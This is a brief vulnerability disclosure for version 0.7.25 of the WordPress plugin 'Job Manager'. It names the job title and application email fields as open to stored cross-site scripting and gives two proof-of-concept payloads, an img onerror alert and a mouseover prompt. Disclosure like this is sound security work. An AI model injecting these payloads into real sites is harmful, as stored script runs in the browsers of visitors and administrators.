# Exploit Title: WrodPress  Plugin Job Manager —— Stored Cross-Site Scripting
# Exploit Author: Thinkland Security Team
# Vendor Homepage: https://wordpress.org/plugins/job-manager/
# Version :  V 0.7.25
# Vulnerability Type: Stored Cross-Site Scripting
# Tested on Windows 10 、XAMPP
# Vulnerability proof：  
1. Job Manager 》Add Job 》Title and Application Email ,insert the xss payload <img src=1 onerror=alert(3)> and "OnMoUsEoVeR=prompt(1)//
![image]()  
